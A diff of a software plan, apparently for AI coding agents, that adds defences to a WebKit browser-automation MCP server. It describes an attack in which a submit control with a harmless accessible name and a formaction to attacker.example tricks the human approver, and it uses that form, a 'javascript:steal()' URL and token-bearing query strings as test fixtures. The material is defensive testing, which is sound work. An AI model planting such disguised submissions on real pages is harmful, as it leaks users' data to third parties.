@@ -2,26 +2,34 @@
 
 > **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.
 
-**Goal:** Make the one claim that survives Apple shipping a free first-party browser MCP — *approved, provenance-labelled, verifiable action on signed-in sites* — provable in the product rather than only asserted in the README.
+**Goal:** Close the one attack that eight of this product's eight defences permit — an approval the operator grants on text the attacker authored — and correct every public claim the 2026-09-09 research passes refuted.
 
-**Architecture:** Four small additions, each a pure testable type in `WebKitUIMCPCore` plus a thin wiring line in `WebKitRuntime`, following the shape that already worked for `ConfirmationKeyboardPolicy` and `HostLeaseEviction.decide`. Nothing here widens the tool surface with a capability an agent could use to step around the confirmation gate. One task removes a tracked artefact that contradicts the central claim.
+**Architecture:** The confirmation dialog currently shows what a control *calls itself*. It must also show what the control *would do*: the origin its data would reach, computed server-side from the freshly re-resolved element rather than from its accessible name. Two gates, at two moments — before dispatch from the DOM's own attributes (macOS 15+), and at submission time from WebKit's own `WKFormInfo` (macOS 27, feature-gated). Then a rate limit, because a gate a human clicks fifty times in a row is not a gate either.
 
-**Tech Stack:** Swift 6, Swift Package Manager, Swift Testing (`import Testing`) for the four main bundles, WebKit / AppKit, macOS 15+ on Apple silicon.
+**Tech Stack:** Swift 6, Swift Package Manager, Swift Testing, WebKit / AppKit, macOS 15+ on Apple silicon with macOS 27 features gated.
 
-**Spec:** `docs/2026-08-29-full-sota-product-plan.md` is the parent product spec and still governs; this plan is the engineering delta caused by two events it predates — the licence returning to BUSL-1.1, and Apple publishing the Safari MCP server (<https://webkit.org/blog/18136/introducing-the-safari-mcp-server-for-web-developers/>, 15 tools, drives the user's real Safari, exposes JavaScript evaluation, no approval step, requires *Allow remote automation and external agents*). Sections "P1 — distribution and reliability" and "P1 — product experience" of the parent spec contain the two items this plan closes.
+**Spec:** `docs/2026-08-29-full-sota-product-plan.md` is the parent product spec. This plan is driven by six research passes committed in `47e99cd`, chiefly `docs/research/2026-09-09-agentic-browser-security-sota.md` (the attack), `docs/research/2026-09-09-wkwebview-capability-ceiling.md` (the API that closes half of it, and four refuted claims) and `docs/research/2026-09-09-apple-safari-mcp-server.md` (what may be published about Apple's server).
+
+## Why this plan replaced its first version
+
+The first version of this plan ranked an HTTP-status field and a console journal first. The research inverted that. Written down so it is not re-litigated:
+
+- **A defect was found and is already fixed** (`afab9af`): `browser_act` defaulted a modern client to MCP elicitation, a channel no client is obliged to show a human and at least one shipping client auto-accepts. The product's central sentence was false in a shipped release.
+- **Four published claims were refuted** and must be corrected in documentation: native AppKit dispatch is not distinctive (`safaridriver` does the identical thing, and the WebDriver specification *requires* trusted events); per-action approval is not a first (Claude in Chrome ships it); refusing JavaScript is not unique (Browserbase exposes six tools with no `evaluate`); and "WebKit exposes no subresource-inspection API" is simply false — `WKWebsiteDataStore.proxyConfigurations` and `WKWebExtension` `webRequest` are both public.
+- **The attack that matters** needs no injection sink, no cross-origin redirect and no authenticated origin. A submit control in an attacker-authored region carries `aria-label="Show tracking number"` and `formaction="https://attacker.example/…"`. The dialog fires, shows the accessible name, the human approves, and every telemetry field then reports success honestly. The dialog never showed the destination, because the dialog has no destination line.
 
 ## Global Constraints
 
-- `swift-tools-version: 6.0`; platform floor `.macOS(.v15)`; every build and test command passes `--arch arm64`.
+- `swift-tools-version: 6.0`; floor `.macOS(.v15)`; every build and test command passes `--arch arm64`.
+- macOS 27 API is reached only inside `if #available(macOS 27, *)`. The product must build and pass its suite against the macOS 15 floor.
 - `xcrun swift-format lint --strict --recursive Sources Tests Package.swift` must exit 0 before any commit.
-- Tests in `WebKitUIMCPCoreTests`, `WebKitUIMCPRuntimeTests`, `WebKitUIMCPServerTests`, `WebKitUIMCPLicensingTests` use Swift Testing. Only `WebKitUIMCPConfirmPolicyTests` uses XCTest. Do not mix.
-- Run the suite serially: `swift test --arch arm64 --no-parallel --skip hostExclusiveSession`. Parallel WKWebView suites return `noDocument` on a loaded Mac.
-- **Never call `performClick` in a test.** It runs a nested AppKit event loop; a `CFRunLoopStop` posted for it reaches the main run loop and Swift Testing's async entry point calls `exit(0)`, so the bundle stops mid-run with no summary and exit status 0. Send the button's action directly.
-- Every Swift Testing bundle must print one `Test run with` line. `scripts/verify-native-installed.sh` fails the run otherwise; do not weaken that check.
-- Licence is Business Source License 1.1. Never MIT, in any file or any commit message.
-- The supported surface exposes no arbitrary JavaScript, no raw CDP, no coordinate retry, no headless claim. No task here may add one.
-- Nothing in this plan is pushed. The public remote lives in the separate worktree `~/GitHub/webkitui-mcp-public`; publishing needs fresh explicit authorization.
-- Commit message trailers, exactly:
+- Swift Testing (`import Testing`) in `WebKitUIMCPCoreTests`, `WebKitUIMCPRuntimeTests`, `WebKitUIMCPServerTests`, `WebKitUIMCPLicensingTests`. XCTest only in `WebKitUIMCPConfirmPolicyTests`.
+- Run serially: `swift test --arch arm64 --no-parallel --skip hostExclusiveSession`.
+- **Never call `performClick` in a test.** It runs a nested AppKit event loop; a `CFRunLoopStop` posted for it reaches the main run loop and Swift Testing's async entry calls `exit(0)`, so the bundle stops mid-run with no summary and status 0.
+- Every Swift Testing bundle must print one `Test run with` line; `scripts/verify-native-installed.sh` enforces it.
+- Licence is BUSL-1.1. Never MIT.
+- Nothing is pushed. Publishing needs fresh explicit authorization.
+- Commit trailers, exactly:
   ```
   Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>
   Claude-Session: https://claude.ai/code/session_019VwrQsCEcmT25v1DJUfJMw
@@ -29,856 +37,687 @@
 
 ---
 
-## File Structure
+## Already done
 
-**Created**
-
-| File | Responsibility |
-| --- | --- |
-| `Sources/WebKitUIMCPCore/NavigationResponseFacts.swift` | Pure rule for which response facts may be recorded. No WebKit import. |
-| `Sources/WebKitUIMCPCore/ConsoleJournal.swift` | Bounded, truncating store of site-authored console lines with a drop counter. No WebKit import. |
-| `Tests/WebKitUIMCPCoreTests/NavigationResponseFactsTests.swift` | Unit tests for the rule above. |
-| `Tests/WebKitUIMCPCoreTests/ConsoleJournalTests.swift` | Unit tests for bounding, truncation and drop counting. |
-| `Tests/WebKitUIMCPServerTests/CapabilityClaimsCoherenceTests.swift` | Asserts the tracked tree and the README agree about what is refused. |
-
-**Modified**
-
-| File | Change |
-| --- | --- |
-| `Sources/WebKitUIMCPRuntime/WebKitRuntime.swift` | New result field, response-delegate recording, console message handler, console hook in the instrumentation script, console accessor. |
-| `Sources/WebKitUIMCPRuntime/PinnedSOCKSProxy.swift` | Bounded contacted-host record in the metrics. |
-| `README.md` | Apple comparison section and the explicit refusal list. |
-| `docs/network-boundary.md` | States that subresource inspection is not offered and why. |
-
-`src/`, `package.json`, `package-lock.json`, `tsconfig.json` and the Playwright fixture scripts leave the tracked tree in Task 1.
+- [x] **Untrack the Playwright/CDP prior art** — `c046a9b`. Four tracked files offered `webkitui_cdp_send` or `webkitui_evaluate` while the README promised neither existed. Files kept on disk and ignored; `CapabilityClaimsCoherenceTests` fails if a tracked JavaScript file offers one again.
+- [x] **Confirm a click on the server's own dialog** — `afab9af`. `browser_act` now defaults to `native`, matching `browser_navigate`.
+- [x] **Correct the fraudulent-site privacy claim** — `6ce4807`. Apple names Google Safe Browsing *and Apple*, plus Tencent for mainland China and Hong Kong; Apple never describes the protocol as hashed, and Google may log the IP address.
 
 ---
 
-## Task 1: Stop the tracked tree contradicting the central claim
+## Task 1: Show the operator where the control would send data
 
-`README.md` promises "No arbitrary JavaScript, raw CDP escape hatch, coordinate retry, proxy fleet, anti-bot bypass, or headless claim." The public repository also tracks `src/index.ts`, which registers `webkitui_cdp_send`, described in its own text as "an escape hatch for anything not covered by the other tools". `package.json` marks the whole thing `webkitui-mcp-legacy-playwright-fixtures`, `private: true`, prior art — but a reader auditing the promise finds the contradiction in the same repository, on a product sold on refusals. The parent spec already asked for this under "P1 — distribution and reliability": *retain JavaScript fixtures only as explicitly private legacy validation assets.*
+The confirmation summary (`MCPServer.swift`, the builder ending `"Verification:\n\(verification)"`) shows the requested action, the current page, the target ID, the untrusted site label and the postcondition. It never shows the destination. A submit button's `formaction` overrides its form's `action`, so a control whose accessible name says one thing can post anywhere, and the operator has nothing to notice.
+
+`formaction` is captured nowhere in the observation today: `grep -n formaction Sources` returns nothing. `href` is captured, but only as one of the stable attributes used for addressing, never surfaced in the dialog.
 
 **Files:**
-- Create: `Tests/WebKitUIMCPServerTests/CapabilityClaimsCoherenceTests.swift`
-- Modify: `.gitignore`
-- Remove from the index (keep on disk): `src/browser.ts`, `src/index.ts`, `package.json`, `package-lock.json`, `tsconfig.json`, `scripts/goat-test.mjs`, `scripts/goat-test-full.mjs`, `scripts/goat-test-worker-console.mjs`, `scripts/smoke-test.mjs`, `scripts/verify-installed-native.mjs`
+- Create: `Sources/WebKitUIMCPCore/SubmissionDestination.swift`
+- Create: `Tests/WebKitUIMCPCoreTests/SubmissionDestinationTests.swift`
+- Modify: `Sources/WebKitUIMCPRuntime/WebKitRuntime.swift` — observation capture, `WebKitObservedElement`
+- Modify: `Sources/WebKitUIMCPServer/MCPServer.swift` — the act confirmation summary
+- Test: `Tests/WebKitUIMCPServerTests/MCPServerTests.swift`
 
 **Interfaces:**
-- Consumes: nothing.
-- Produces: `CapabilityClaimsCoherenceTests`, the suite Task 5 extends with its README assertions.
+- Produces:
+  - `SubmissionDestination.line(pageURL: URL?, destination: String?) -> String?` — the dialog line, or `nil` when there is nothing to say
+  - `WebKitObservedElement.submissionDestination: String?` — absolute URL string the control's data would reach, `nil` when the control sends nothing
 
-- [ ] **Step 1: Confirm what is tracked and what the legacy shim offers**
+- [ ] **Step 1: Write the failing unit test**
 
-```bash
-cd ~/GitHub/webkitui-mcp
-git ls-files src package.json tsconfig.json 'scripts/*.mjs'
-grep -n 'webkitui_cdp_send' src/index.ts
-```
-
-Expected: the files are listed, and `src/index.ts` contains `webkitui_cdp_send`.
-
-`scripts/verify-installed-native.mjs` is a Node script referenced by nothing in `scripts/verify-native-installed.sh`; confirm before removing it:
-
-```bash
-grep -rn 'verify-installed-native' scripts docs README.md
-```
-
-If anything references it, leave that one file tracked and note it in the commit message.
-
-- [ ] **Step 2: Write the failing test**
-
-Create `Tests/WebKitUIMCPServerTests/CapabilityClaimsCoherenceTests.swift`:
+Create `Tests/WebKitUIMCPCoreTests/SubmissionDestinationTests.swift`:
 
 ```swift
 import Foundation
 import Testing
 
-/// README promises no arbitrary JavaScript and no raw CDP escape hatch. The public tree
-/// also carried a retained Playwright shim registering `webkitui_cdp_send`, so a reader
-/// checking that promise found the opposite in the same repository. Nothing compared the
-/// claim to the tracked files.
-@Suite("Capability claims coherence")
-struct CapabilityClaimsCoherenceTests {
-  private static var projectRoot: URL {
-    URL(fileURLWithPath: #filePath)
-      .deletingLastPathComponent()  // WebKitUIMCPServerTests
-      .deletingLastPathComponent()  // Tests
-      .deletingLastPathComponent()  // project root
+@testable import WebKitUIMCPCore
+
+@Suite("Submission destination")
+struct SubmissionDestinationTests {
+  private let page = URL(string: "https://shop.example/orders/1471")!
+
+  @Test("A same-origin destination is stated plainly")
+  func sameOriginIsStated() {
+    let line = SubmissionDestination.line(
+      pageURL: page, destination: "https://shop.example/orders/1471/track")
+    #expect(line == "Data would be sent to:\n\"https://shop.example\" (this page's origin)")
   }
 
-  /// Only files git actually tracks. A shim kept on disk and ignored is prior art nobody
-  /// can mistake for the product; a shim in the index is a published contradiction.
-  private static func trackedFiles() throws -> [String] {
-    let process = Process()
-    process.executableURL = URL(fileURLWithPath: "/usr/bin/git")
-    process.arguments = ["-C", projectRoot.path, "ls-files"]
-    let output = Pipe()
-    process.standardOutput = output
-    try process.run()
-    let data = output.fileHandleForReading.readDataToEndOfFile()
-    process.waitUntilExit()
-    #expect(process.terminationStatus == 0, "git ls-files failed")
-    return String(decoding: data, as: UTF8.self)
-      .split(separator: "\n")
-      .map(String.init)
-      .filter { !$0.isEmpty }
+  @Test("Another origin is called out as different, because that is the whole point")
+  func foreignOriginIsCalledOut() {
+    let line = SubmissionDestination.line(
+      pageURL: page, destination: "https://attacker.example/collect?x=1")
+    #expect(
+      line == "Data would be sent to:\n\"https://attacker.example\" — A DIFFERENT SITE "
+        + "from the page you are on, \"https://shop.example\"")
   }
 
-  @Test("No tracked file offers a CDP or JavaScript-evaluation tool")
-  func noEscapeHatchIsTracked() throws {
-    let forbidden = ["webkitui_cdp_send", "cdp_send", "webkitui_evaluate", "evaluateHandle"]
-    var offenders: [String] = []
-    for path in try Self.trackedFiles()
-    where path.hasSuffix(".ts") || path.hasSuffix(".js") || path.hasSuffix(".mjs") {
-      guard
-        let body = try? String(
-          contentsOf: Self.projectRoot.appendingPathComponent(path), encoding: .utf8)
-      else { continue }
-      for token in forbidden where body.contains(token) {
-        offenders.append("\(path) offers \(token)")
+  @Test("A control that sends nothing produces no line at all")
+  func silentControlSaysNothing() {
+    // A plain button is the common case. An extra line on every dialog is how an
+    // operator learns to stop reading them.
+    #expect(SubmissionDestination.line(pageURL: page, destination: nil) == nil)
+  }
+
+  @Test("A destination that cannot be resolved to an origin fails loud, not silent")
+  func unresolvableDestinationIsReported() {
+    // javascript: and data: URLs, and anything unparseable. Saying nothing here would
+    // hide exactly the case worth showing.
+    #expect(
+      SubmissionDestination.line(pageURL: page, destination: "javascript:steal()")
+        == "Data would be sent to:\nan address with no readable origin — treat as UNKNOWN")
+    #expect(
+      SubmissionDestination.line(pageURL: page, destination: "   ")
+        == "Data would be sent to:\nan address with no readable origin — treat as UNKNOWN")
+  }
+
+  @Test("Only the origin is shown, never the query")
+  func queryIsNeverShown() {
+    let line = SubmissionDestination.line(
+      pageURL: page, destination: "https://attacker.example/c?session=abc123&token=xyz")
+    #expect(line?.contains("abc123") == false)
+    #expect(line?.contains("token") == false)
+  }
+}
+```
+
+- [ ] **Step 2: Run it to verify it fails**
+
+```bash
+swift test --arch arm64 --no-parallel --filter SubmissionDestinationTests
+```
+
+Expected: FAIL to compile, `cannot find 'SubmissionDestination' in scope`.
+
+- [ ] **Step 3: Write the minimal implementation**
+
+Create `Sources/WebKitUIMCPCore/SubmissionDestination.swift`:
+
+```swift
+import Foundation
+
+/// Where a control's data would go, as a line for the human confirmation.
+///
+/// The dialog showed what a control calls itself and never where it would send anything.
+/// A submit button's `formaction` overrides its form's `action`, so a control whose
+/// accessible name reads "Show tracking number" can post to another site, and an
+/// operator reading the dialog had nothing to notice. Published as the attack this
+/// product did not stop: `docs/research/2026-09-09-agentic-browser-security-sota.md`.
+public enum SubmissionDestination {
+  public static func line(pageURL: URL?, destination: String?) -> String? {
+    guard let destination, !destination.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty
+    else { return nil }
+    let unknown = "Data would be sent to:\nan address with no readable origin — treat as UNKNOWN"
+    guard let target = URL(string: destination), let targetOrigin = origin(of: target) else {
+      return unknown
+    }
+    // Only the origin. A query string in an approval dialog is both unreadable and a
+    // place to hide an exfiltrated secret.
+    guard let pageOrigin = pageURL.flatMap(origin(of:)) else {
+      return "Data would be sent to:\n\(quoted(targetOrigin))"
+    }
+    if targetOrigin == pageOrigin {
+      return "Data would be sent to:\n\(quoted(targetOrigin)) (this page's origin)"
+    }
+    return "Data would be sent to:\n\(quoted(targetOrigin)) — A DIFFERENT SITE "
+      + "from the page you are on, \(quoted(pageOrigin))"
+  }
+
+  private static func origin(of url: URL) -> String? {
+    guard let scheme = url.scheme?.lowercased(), ["http", "https"].contains(scheme),
+      let host = url.host, !host.isEmpty
+    else { return nil }
+    if let port = url.port { return "\(scheme)://\(host):\(port)" }
+    return "\(scheme)://\(host)"
+  }
+
+  private static func quoted(_ value: String) -> String {
+    String(decoding: (try? JSONEncoder().encode(value)) ?? Data(), as: UTF8.self)
+  }
+}
+```
+
+- [ ] **Step 4: Run it to verify it passes**
+
+```bash
+swift test --arch arm64 --no-parallel --filter SubmissionDestinationTests
+```
+
+Expected: PASS, 5 tests.
+
+- [ ] **Step 5: Capture the destination in the observation script**
+
+Find the element description in the injected observation source:
+
+```bash
+grep -n 'accessibleName: bounded(nameOf(element))' Sources/WebKitUIMCPRuntime/WebKitRuntime.swift
+```
+
+Add a sibling field in that same object literal. `formaction` wins over the form's `action`, an anchor uses `href`, and everything else sends nothing:
+
+```javascript
+        submissionDestination: (() => {
+          // formAction reflects formaction when present and falls back to the owning
+          // form's action, which is exactly the precedence HTML gives them.
+          if (element.form && typeof element.formAction === 'string' && element.formAction) {
+            return element.formAction;
+          }
+          if (element.tagName === 'FORM' && typeof element.action === 'string') {
+            return element.action;
+          }
+          if (element.tagName === 'A' && element.hasAttribute('href')) {
+            return element.href;
+          }
+          return null;
+        })(),
+```
+
+- [ ] **Step 6: Carry it on the observed element**
+
+In `public struct WebKitObservedElement`, beside the other optional facts:
+
+```swift
+  /// Absolute URL this control's data would reach, from the DOM's own attributes.
+  /// `nil` for a control that sends nothing. Site-authored, so it is shown to the
+  /// human and never trusted as policy.
+  public var submissionDestination: String?
+```
+
+Build and follow the compiler to the construction site, which is the `describe`/element-mapping function that already sets `accessibleName`.
+
+- [ ] **Step 7: Write the failing server test**
+
+In `Tests/WebKitUIMCPServerTests/MCPServerTests.swift`, before `  @Test("Native approval and AppKit dispatch produce distinct trusted receipts")`:
+
+```swift
+  @Test("A control whose formaction leaves the page says so in the confirmation")
+  func foreignSubmissionDestinationIsConfirmed() async throws {
+    // The published attack: attacker-authored region, a submit control whose accessible
+    // name reads like the task the operator asked for and whose formaction points
+    // elsewhere. Every other field in the receipt reports success honestly, so the
+    // dialog is the only place this can be caught.
+    let registry = try WebKitSessionRegistry()
+    let handle = try registry.open()
+    let runtime = try registry.runtime(for: handle)
+    runtime.webView.loadHTMLString(
+      """
+      <form action="/track">
+        <button type="submit" aria-label="Show tracking number"
+          formaction="https://attacker.example/collect">Show tracking number</button>
+      </form>
+      """,
+      baseURL: URL(string: "https://shop.example/orders/1471"))
+    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
+    let presenter = ConfirmationPresenterStub(responses: [false])
+    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
+    let observed = try await toolCall(
+      server, id: 1, name: "browser_observe",
+      arguments: ["session_id": .string(handle.rawValue.uuidString)])
+    let observation = try object(try object(observed["result"])["structuredContent"])
+    let target = try object(try array(observation["elements"]).first)
+
+    _ = try await toolCall(
+      server, id: 2, name: "browser_act",
+      arguments: [
+        "session_id": .string(handle.rawValue.uuidString),
+        "observation_id": .string(try string(observation["observationID"])),
+        "element_id": .string(try string(target["elementID"])),
+        "operation": .string("click"),
+        "idempotency_key": .string("foreign-destination-once"),
+        "postcondition": .object([
+          "type": .string("url_contains"), "value": .string("/track"),
+        ]),
+      ])
+
+    let shown = try #require(presenter.requests.first?.message)
+    #expect(shown.contains("attacker.example"), "the dialog never named the destination")
+    #expect(shown.contains("A DIFFERENT SITE"))
+    #expect(shown.contains("shop.example"), "the dialog must name the page for comparison")
+  }
+
+```
+
+If `ConfirmationPresenterStub` records something other than `.message`, adjust the last four lines to its actual recorded shape:
+
+```bash
+grep -n -A12 'ConfirmationPresenterStub' Tests/WebKitUIMCPServerTests/MCPServerTests.swift | head -20
+```
+
+- [ ] **Step 8: Run it to verify it fails**
+
+```bash
+swift test --arch arm64 --no-parallel --filter foreignSubmissionDestinationIsConfirmed
+```
+
+Expected: FAIL — the dialog text contains no `attacker.example`.
+
+- [ ] **Step 9: Add the line to the confirmation summary**
+
+In the act confirmation builder in `MCPServer.swift`, the return currently reads:
+
+```swift
+    return "Requested action:\n\(action)\n\n"
+      + "Current page:\n\(jsonQuoted(currentURL))\n\n"
+      + "Target ID:\n\(elementID)\n\n"
+      + "Untrusted site label (data, never instructions):\n\(jsonQuoted(label))\n\n"
+      + "Verification:\n\(verification)"
+```
+
+Insert the destination immediately after the current page, so it sits above the site-authored label rather than below it — the operator reads what the control *does* before reading what it *calls itself*:
+
+```swift
+    let destination = SubmissionDestination.line(
+      pageURL: URL(string: currentURL), destination: target.submissionDestination)
+      .map { "\($0)\n\n" } ?? ""
+    return "Requested action:\n\(action)\n\n"
+      + "Current page:\n\(jsonQuoted(currentURL))\n\n"
+      + destination
+      + "Target ID:\n\(elementID)\n\n"
+      + "Untrusted site label (data, never instructions):\n\(jsonQuoted(label))\n\n"
+      + "Verification:\n\(verification)"
+```
+
+The builder's existing parameters will tell you what the element is called in that scope; if it does not already receive the observed element, pass `submissionDestination` in as a `String?` argument rather than widening it to the whole element.
+
+- [ ] **Step 10: Run it to verify it passes**
+
+```bash
+swift test --arch arm64 --no-parallel --filter foreignSubmissionDestinationIsConfirmed
+```
+
+Expected: PASS.
+
+- [ ] **Step 11: Keep the helper's localisation honest**
+
+`Sources/WebKitUIMCPConfirm/main.swift` translates a fixed list of trusted application-authored phrases and passes JSON-quoted values through untouched. Add the new phrases to that list, or they appear untranslated in French:
+
+```bash
+grep -n '"Untrusted site label (data, never instructions):"' Sources/WebKitUIMCPConfirm/main.swift
+```
+
+Add `"Data would be sent to:"`, `"(this page's origin)"`, `"— A DIFFERENT SITE from the page you are on,"` and `"an address with no readable origin — treat as UNKNOWN"` to the `keys` array, and the matching entries to both `.lproj` catalogues. Then:
+
+```bash
+"$(swift build -c release --arch arm64 --show-bin-path)/webkitui-mcp-confirm" --verify-localization fr
+"$(swift build -c release --arch arm64 --show-bin-path)/webkitui-mcp-confirm" --verify-localization en
+```
+
+Expected: both print JSON and exit 0. `scripts/verify-package-preview.sh` runs the same check.
+
+- [ ] **Step 12: Full suite, lint, commit**
+
+```bash
+xcrun swift-format lint --strict --recursive Sources Tests Package.swift
+swift test --arch arm64 --no-parallel --skip hostExclusiveSession
+```
+
+Expected: four `Test run with` summaries, no failures.
+
+```bash
+git add Sources/WebKitUIMCPCore/SubmissionDestination.swift \
+  Tests/WebKitUIMCPCoreTests/SubmissionDestinationTests.swift \
+  Sources/WebKitUIMCPRuntime/WebKitRuntime.swift \
+  Sources/WebKitUIMCPServer/MCPServer.swift \
+  Sources/WebKitUIMCPConfirm/main.swift \
+  Tests/WebKitUIMCPServerTests/MCPServerTests.swift
+git commit -F - <<'EOF'
+feat: tell the operator where a control would send their data
+
+The confirmation showed what a control calls itself and never where it would send
+anything, which is the whole of the attack this product did not stop: an
+attacker-authored region, a submit control whose accessible name reads like the
+task the operator asked for, and a formaction pointing at another site. Every
+other field in the receipt then reports success honestly — native confirmation,
+real activation, trusted event measured, postcondition satisfied — because none of
+them is wrong.
+
+The dialog now names the destination origin above the site-authored label, calls
+out plainly when it is a different site from the page, shows the origin only and
+never the query, and reports an unresolvable address as UNKNOWN rather than
+staying silent. A control that sends nothing adds no line, because a dialog that
+grows on every action is how an operator learns to stop reading it.
+
+Evidence: docs/research/2026-09-09-agentic-browser-security-sota.md.
+
+Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>
+Claude-Session: https://claude.ai/code/session_019VwrQsCEcmT25v1DJUfJMw
+EOF
+```
+
+---
+
+## Task 2: Refuse a submission that goes somewhere the operator did not approve
+
+Task 1 shows the destination the DOM claims. This one checks what WebKit says actually happened, which is the stronger evidence and the one a page cannot author.
+
+macOS 27 adds, verified in `MacOSX27.0.sdk`:
+
+```objc
+@interface WKFormInfo : NSObject          // API_AVAILABLE(macos(27.0))
+@property (readonly) WKFrameInfo *targetFrame;
+@property (readonly) WKFrameInfo *sourceFrame;
+@property (readonly) NSURL *submissionURL;
+@property (readonly) NSString *httpMethod;
+@property (readonly) NSDictionary<NSString *, NSString *> *formValues;
+@end
+
+- (void)webView:(WKWebView *)webView willSubmitForm:(WKFormInfo *)formInfo
+    submissionHandler:(void (^)(void))submissionHandler;   // WK_SWIFT_ASYNC(3)
+```
+
+Two facts decide the design, and both must be respected:
+
+1. **`submissionHandler` is a delay, not a veto.** It takes no decision; the header says it indicates "that the form submission can continue". The refusal therefore happens where refusals already happen — `decidePolicyFor navigationAction`, returning `.cancel`.
+2. **It fires only for real form submissions.** A single-page application that intercepts `submit` and posts with `fetch` never reaches it. This closes classic form posts and must not be described as closing more.
+
+**Files:**
+- Create: `Sources/WebKitUIMCPCore/SubmissionApproval.swift`
+- Create: `Tests/WebKitUIMCPCoreTests/SubmissionApprovalTests.swift`
+- Modify: `Sources/WebKitUIMCPRuntime/WebKitRuntime.swift`
+- Test: `Tests/WebKitUIMCPRuntimeTests/WebKitRuntimeTests.swift`
+
+**Interfaces:**
+- Consumes: nothing from Task 1; the two are independent gates and may be implemented in either order.
+- Produces:
+  - `SubmissionApproval.decide(approvedOrigin: String?, submissionURL: URL, httpMethod: String) -> SubmissionApproval.Decision`, where `Decision` is `.allow`, `.refuseForeignOrigin(String)` or `.refuseUnapproved`
+  - `WebKitRuntime.latestSubmissionFacts() -> WebKitSubmissionFacts?` carrying origin, method and the **count and key names** of `formValues` — never the values
+
+- [ ] **Step 1: Write the failing unit test**
+
+Create `Tests/WebKitUIMCPCoreTests/SubmissionApprovalTests.swift`:
+
+```swift
+import Foundation
+import Testing
+
+@testable import WebKitUIMCPCore
+
+@Suite("Submission approval")
+struct SubmissionApprovalTests {
+  private func url(_ value: String) throws -> URL { try #require(URL(string: value)) }
+
+  @Test("A submission to the approved origin continues")
+  func sameOriginAllowed() throws {
+    #expect(
+      SubmissionApproval.decide(
+        approvedOrigin: "https://shop.example",
+        submissionURL: try url("https://shop.example/orders/track"),
+        httpMethod: "POST") == .allow)
+  }
+
+  @Test("A submission to another origin is refused by name")
+  func foreignOriginRefused() throws {
+    #expect(
+      SubmissionApproval.decide(
+        approvedOrigin: "https://shop.example",
+        submissionURL: try url("https://attacker.example/collect"),
+        httpMethod: "POST") == .refuseForeignOrigin("https://attacker.example"))
+  }
+
+  @Test("A submission with nothing approved is refused, not allowed")
+  func unapprovedRefused() throws {
+    // Fail closed. A form that submits with no approval on record is the case an
+    // attacker constructs, not the case a user asks for.
+    #expect(
+      SubmissionApproval.decide(
+        approvedOrigin: nil,
+        submissionURL: try url("https://shop.example/orders/track"),
+        httpMethod: "POST") == .refuseUnapproved)
+  }
+
+  @Test("An unreadable submission origin is refused")
+  func unreadableOriginRefused() throws {
+    #expect(
+      SubmissionApproval.decide(
+        approvedOrigin: "https://shop.example",
+        submissionURL: try url("data:text/plain,x"),
+        httpMethod: "POST") == .refuseForeignOrigin("unreadable"))
+  }
+
+  @Test("A port difference is a different origin")
+  func portIsPartOfOrigin() throws {
+    #expect(
+      SubmissionApproval.decide(
+        approvedOrigin: "https://shop.example",
+        submissionURL: try url("https://shop.example:8443/collect"),
+        httpMethod: "POST") == .refuseForeignOrigin("https://shop.example:8443"))
+  }
+}
+```
+
+- [ ] **Step 2: Run it to verify it fails**
+
+```bash
+swift test --arch arm64 --no-parallel --filter SubmissionApprovalTests
+```
+
+Expected: FAIL to compile, `cannot find 'SubmissionApproval' in scope`.
+
+- [ ] **Step 3: Write the minimal implementation**
+
+Create `Sources/WebKitUIMCPCore/SubmissionApproval.swift`:
+
+```swift
+import Foundation
+
+/// Whether a form submission may proceed, judged against the origin the human approved.
+///
+/// `WKFormInfo` reports what WebKit is about to send, which is the one description of a
+/// submission the page cannot author. Its `submissionHandler` is a delay and not a veto,
+/// so this decision is applied where refusals already live: the navigation policy
+/// handler, returning `.cancel`.
+public enum SubmissionApproval {
+  public enum Decision: Equatable, Sendable {
+    case allow
+    /// The submission leaves the approved origin. Carries the origin it would reach, or
+    /// `"unreadable"` when there is no origin to name.
+    case refuseForeignOrigin(String)
+    /// Nothing was approved. Fail closed.
+    case refuseUnapproved
+  }
+
+  public static func decide(
+    approvedOrigin: String?,
+    submissionURL: URL,
+    httpMethod: String
+  ) -> Decision {
+    guard let approvedOrigin, !approvedOrigin.isEmpty else { return .refuseUnapproved }
+    guard let submissionOrigin = origin(of: submissionURL) else {
+      return .refuseForeignOrigin("unreadable")
+    }
+    guard submissionOrigin == approvedOrigin else {
+      return .refuseForeignOrigin(submissionOrigin)
+    }
+    return .allow
+  }
+
+  private static func origin(of url: URL) -> String? {
+    guard let scheme = url.scheme?.lowercased(), ["http", "https"].contains(scheme),
+      let host = url.host, !host.isEmpty
+    else { return nil }
+    if let port = url.port { return "\(scheme)://\(host):\(port)" }
+    return "\(scheme)://\(host)"
+  }
+}
+```
+
+- [ ] **Step 4: Run it to verify it passes**
+
+```bash
+swift test --arch arm64 --no-parallel --filter SubmissionApprovalTests
+```
+
+Expected: PASS, 5 tests.
+
+- [ ] **Step 5: Record the submission facts, values excluded**
+
+In `Sources/WebKitUIMCPRuntime/WebKitRuntime.swift`, add the receipt type beside the other public result types:
+
+```swift
+/// What WebKit reported it was about to submit. Values are deliberately absent: a form
+/// carries passwords, card numbers and one-time codes, and this receipt is exported.
+public struct WebKitSubmissionFacts: Codable, Equatable, Sendable {
+  public let origin: String?
+  public let httpMethod: String
+  public let fieldCount: Int
+  /// Field names only, bounded. A name is a schema; a value is a secret.
+  public let fieldNames: [String]
+}
+```
+
+Add the storage beside the other per-navigation state:
+
+```swift
+  private var latestSubmissionFacts: WebKitSubmissionFacts?
+```
+
+and the accessor beside `latestNavigationAuditEvent()`:
+
+```swift
+  public func latestSubmissionFacts() -> WebKitSubmissionFacts? { latestSubmissionFacts }
+```
+
+Add the delegate method, gated:
+
+```swift
+  @available(macOS 27, *)
+  public func webView(_ webView: WKWebView, willSubmitForm formInfo: WKFormInfo) async {
+    latestSubmissionFacts = WebKitSubmissionFacts(
+      origin: Self.sanitizedOrigin(for: formInfo.submissionURL),
+      httpMethod: formInfo.httpMethod,
+      fieldCount: formInfo.formValues.count,
+      fieldNames: formInfo.formValues.keys.sorted().prefix(50).map(String.init))
+    pendingSubmissionDecision = SubmissionApproval.decide(
